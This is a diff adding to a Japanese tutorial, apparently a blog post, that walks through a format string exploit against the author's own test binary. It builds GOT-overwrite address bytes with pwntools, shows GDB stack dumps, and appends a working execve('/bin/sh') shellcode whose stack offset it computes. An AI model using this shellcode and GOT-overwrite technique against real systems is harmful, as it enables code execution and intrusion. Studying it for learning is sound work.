@@ -77,17 +77,98 @@ End of assembler dump.
 
 ```sh
 gef➤  r AAAA
-Starting program: /home/mkm/Develop/unix/c_test/got/fsb AAAA
-[+] buf = 0xffffd168
 ⋮
 gef➤  xinfo 0x804a018 
 ──────────────────────────────────────────[ xinfo: 0x804a018 ]──────────────────────────────────────────
 Page: 0x0804a000  →  0x0804b000 (size=0x1000)
 Permissions: rwx
-Pathname: /home/mkm/Develop/unix/c_test/got/fsb
-Offset (from page): 0x18
-Inode: 1048602
-Segment: .got.plt (0x0804a000-0x0804a020)
-Symbol: _GLOBAL_OFFSET_TABLE_+24
+⋮
 ```
+
+*Permissions*を見てみると、**w**ビットが立っていることから書き込み可能領域であることがわかる
+
+%hhn指定子を使って1byteずつ処理する予定なので、実行時の引数は
+
+```python
+>>> from pwn import *
+>>> addr = 0x0804a018
+>>> p32(addr) + p32(addr + 1) + p32(addr + 2) + p32(addr + 3)
+b'\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08'
+```
+
+GDBにこれを引数で渡してやる
+
+```sh
+gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08"')
+⋮
+gef➤  telescope $esp l20
+0xffffd130│+0x00: 0xffffd158  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $esp
+0xffffd134│+0x04: 0xffffd4ba  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18
+0xffffd138│+0x08: 0x00000064 ("d"?)
+0xffffd13c│+0x0c: 0x00f0b5ff
+0xffffd140│+0x10: 0xffffd17e  →  0x00000000
+0xffffd144│+0x14: 0x00000001
+0xffffd148│+0x18: 0x000000c2
+0xffffd14c│+0x1c: 0xffffd274  →  0xffffd494  →  "/home/mkm/Develop/unix/c_test/got/fsb"
+0xffffd150│+0x20: 0xffffd17e  →  0x00000000
+0xffffd154│+0x24: 0xffffd280  →  0xffffd4cb  →  "XDG_SEAT=seat0"
+0xffffd158│+0x28: 0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $eax
+0xffffd15c│+0x2c: 0x0804a019  →  <_GLOBAL_OFFSET_TABLE_+25> add DWORD PTR [eax+ecx*1], 0x0
+0xffffd160│+0x30: 0x0804a01a  →  <_GLOBAL_OFFSET_TABLE_+26> add al, 0x8
+0xffffd164│+0x34: 0x0804a01b  →  <_GLOBAL_OFFSET_TABLE_+27> or BYTE PTR [eax], al
+0xffffd168│+0x38: 0x00000000
+0xffffd16c│+0x3c: 0x00000000
+0xffffd170│+0x40: 0x00000000
+0xffffd174│+0x44: 0x00000000
+0xffffd178│+0x48: 0x00000000
+0xffffd17c│+0x4c: 0x00000000
+```
+
+スタックフレームを見ると、先ほどなぜ*10*番目に**41414141**が位置していたかがわかる（$eax = $esp + 0x28, 0x28 / 4 = 10）
+
+## Shellcodeを入れる位置（オフセット）
+
+[^1] と同様のshellcodeをここでは用いる
+
+```python
+shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
+```
+
+shellcodeを挿入するとして、どこに入れるといいだろうか？
+先ほどの、アドレス引数4つの後にくっつけてGDBで実行してみる
+
+```sh
+gef➤  r $(python -c 'print "\x18\xa0\x04\x08\x19\xa0\x04\x08\x1a\xa0\x04\x08\x1b\xa0\x04\x08" + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"')
+⋮
+gef➤  telescope $esp l25
+0xffffd110│+0x00: 0xffffd138  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $esp
+0xffffd114│+0x04: 0xffffd4a2  →  0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18
+0xffffd118│+0x08: 0x00000064 ("d"?)
+0xffffd11c│+0x0c: 0x00f0b5ff
+0xffffd120│+0x10: 0xffffd15e  →  0x000080cd
+0xffffd124│+0x14: 0x00000001
+0xffffd128│+0x18: 0x000000c2
+0xffffd12c│+0x1c: 0xffffd254  →  0xffffd47c  →  "/home/mkm/Develop/unix/c_test/got/fsb"
+0xffffd130│+0x20: 0xffffd15e  →  0x000080cd
+0xffffd134│+0x24: 0xffffd260  →  0xffffd4cb  →  "XDG_SEAT=seat0"
+0xffffd138│+0x28: 0x0804a018  →  0x080483a6  →  <putchar@plt+6> push 0x18	 ← $eax
+0xffffd13c│+0x2c: 0x0804a019  →  <_GLOBAL_OFFSET_TABLE_+25> add DWORD PTR [eax+ecx*1], 0x0
+0xffffd140│+0x30: 0x0804a01a  →  <_GLOBAL_OFFSET_TABLE_+26> add al, 0x8
+0xffffd144│+0x34: 0x0804a01b  →  <_GLOBAL_OFFSET_TABLE_+27> or BYTE PTR [eax], al
+0xffffd148│+0x38: 0x6852d231
+0xffffd14c│+0x3c: 0x68732f2f
+0xffffd150│+0x40: 0x69622f68
+0xffffd154│+0x44: 0x52e3896e
+0xffffd158│+0x48: 0x8de18953
+0xffffd15c│+0x4c: 0x80cd0b42
+0xffffd160│+0x50: 0x00000000
+0xffffd164│+0x54: 0x00000000
+0xffffd168│+0x58: 0x00000000
+0xffffd16c│+0x5c: 0x00000000
+0xffffd170│+0x60: 0x00000000
+```
+
+先ほどとは異なり、*0xffffd148*からshellcodeがスタックに積まれている
+すなわち、このアドレスに飛ばすようにGOT tableを書き換えればshellが起動するはず
+このアドレスと$eax（**\x18\xa0\x04\x08**が最初に書き込まれたアドレス）からのオフセットは、4byteのアドレス4個分なので、4 * 4 = **16**
 
